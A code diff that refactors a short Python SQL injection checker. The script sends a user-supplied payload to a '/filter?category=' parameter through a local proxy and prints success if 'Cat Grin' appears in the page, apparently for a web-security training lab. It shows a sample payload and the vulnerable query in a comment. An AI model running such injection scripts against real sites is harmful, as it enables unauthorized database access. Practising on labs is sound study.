@@ -4,10 +4,11 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-def is_exploitable(url, payload):
-    proxies = {
+proxies = {
     'http': 'http://127.0.0.1:8080',
-    'https':'http://127.0.0.1:8080'}
+    'https': 'http://127.0.0.1:8080'}
+
+def is_exploitable(url, payload):
     uri = '/filter?category='
     request = requests.get(
         url + uri + payload,
@@ -15,14 +16,10 @@ def is_exploitable(url, payload):
         proxies=proxies)
     return "Cat Grin" in request.text
 
-def get_url_payload():
-    url =sys.argv[1].strip()
-    payload = sys.argv[2].strip()
-    return url, payload
-
 if __name__ == "__main__":
     try:
-        url, payload = get_url_payload()
+        url =sys.argv[1].strip()
+        payload = sys.argv[2].strip()
         if is_exploitable(url, payload):
             print("[+] SQL injection successful!")
         else:
@@ -32,7 +29,6 @@ if __name__ == "__main__":
         print('[-] Example: %s www.example.com "1=1"' % sys.argv[0]) 
         sys.exit(-1)
 
-#Notes
 
 # SQL injection - product category filter
 # SELECT * FROM products WHERE category = 'Gifts' AND released = 1 
